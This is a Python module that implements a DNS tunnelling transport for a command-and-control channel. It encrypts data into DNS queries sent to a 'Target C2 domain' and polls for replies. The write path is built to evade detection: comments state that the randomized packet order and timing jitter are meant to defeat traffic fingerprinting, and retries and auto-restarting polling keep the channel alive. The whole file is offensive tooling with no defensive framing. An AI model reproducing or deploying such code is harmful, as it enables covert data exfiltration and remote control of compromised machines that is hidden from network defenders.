import queue
import threading
import uuid
import random
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

from lib.transport.encoding import encode
from lib.transport.dns import send_dns_query
from lib.transport.polling import poll_read


class DNSStream:
    def __init__(self, target_domain, encryption_key, max_workers=8):
        self.target_domain = target_domain
        self.encryption_key = encryption_key
        self.client_guid = uuid.uuid4().bytes
        self.packet_queue = queue.Queue()
        self.max_workers = max_workers
        self.write_lock = threading.Lock()
        self.poll_thread = None
        self.is_active = True
        self._start_polling()

    def _start_polling(self):
        """Start polling thread with error recovery."""
        self.poll_thread = threading.Thread(
            target=self._poll_with_recovery, 
            args=(self,), 
            daemon=True
        )
        self.poll_thread.start()

    def _poll_with_recovery(self, stream):
        """Polling wrapper with automatic restart on crash."""
        while self.is_active:
            try:
                poll_read(stream)
            except Exception as e:
                # Log error if needed, then restart after brief delay
                time.sleep(random.uniform(1.0, 3.0))
                if self.is_active:
                    continue
                else:
                    break

    def read(self, timeout=None):
        """
        Read data from queue with optional timeout.
        Returns None if timeout expires.
        """
        try:
            return self.packet_queue.get(timeout=timeout)
        except queue.Empty:
            return None

    def write(self, data: bytes):
        """
        Write data with improved evasion and reliability.
        - Randomized packet ordering (defeats sequence analysis)
        - Jittered timing between packets (defeats burst fingerprinting)
        - Error handling and retry logic
        """
        with self.write_lock:
            try:
                # Encode data into packets
                init_packet, data_packets = encode(
                    data, 
                    True, 
                    self.encryption_key, 
                    self.target_domain, 
                    self.client_guid
                )
                
                # Send init packet first (required for protocol)
                send_dns_query(init_packet.encode(), self.target_domain)
                
                # Anti-fingerprinting: randomize packet order
                # Defeats sequence analysis and traffic fingerprinting
                packets_with_order = list(enumerate(data_packets))
                
                # 70% chance to randomize order (if protocol supports it)
                # Keep ordered 30% of time to mimic mixed traffic patterns
                if random.random() < 0.7 and len(data_packets) > 1:
                    random.shuffle(packets_with_order)
                
                # Send packets concurrently with timing jitter
                successful = self._send_packets_with_jitter(packets_with_order)
                
                if successful < len(data_packets):
                    # Some packets failed - could implement retry logic here
                    pass
                
                return len(data)
                
            except Exception as e:
                # Handle encoding/send errors gracefully
                return 0

    def _send_packets_with_jitter(self, packets_with_order):
        """
        Send packets concurrently with micro-jitter between submissions.
        Defeats burst fingerprinting while maintaining performance.
        """
        successful_count = 0
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for idx, (original_idx, packet) in enumerate(packets_with_order):
                # Add micro-jitter between packet submissions
                # Breaks perfect simultaneity fingerprint
                if idx > 0:
                    # 0-15ms jitter between submissions
                    jitter_ms = random.uniform(0, 0.015)
                    time.sleep(jitter_ms)
                
                # Submit packet send task
                future = executor.submit(
                    self._send_packet_with_retry,
                    packet,
                    self.target_domain
                )
                futures.append(future)
            
            # Collect results
            for future in as_completed(futures):
                try:
                    if future.result():
                        successful_count += 1
                except Exception:
                    pass
        
        return successful_count

    def _send_packet_with_retry(self, packet, domain, max_retries=2):
        """
        Send single packet with retry logic for resilience.
        """
        for attempt in range(max_retries + 1):
            try:
                send_dns_query(packet.encode(), domain)
                return True
            except Exception as e:
                if attempt < max_retries:
                    # Exponential backoff with jitter
                    backoff = (2 ** attempt) * random.uniform(0.1, 0.3)
                    time.sleep(backoff)
                else:
                    return False
        return False

    def close(self):
        """Clean shutdown of stream."""
        self.is_active = False
        if self.poll_thread and self.poll_thread.is_alive():
            self.poll_thread.join(timeout=2.0)

    def __enter__(self):
        """Context manager support."""
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.close()
        return False


def dns_stream(target_domain, encryption_key, max_workers=8):
    """
    Factory function for creating DNS streams.
    
    Args:
        target_domain: Target C2 domain
        encryption_key: Encryption key for packets
        max_workers: Max concurrent DNS queries (default 8)
    """
    return DNSStream(target_domain, encryption_key, max_workers)
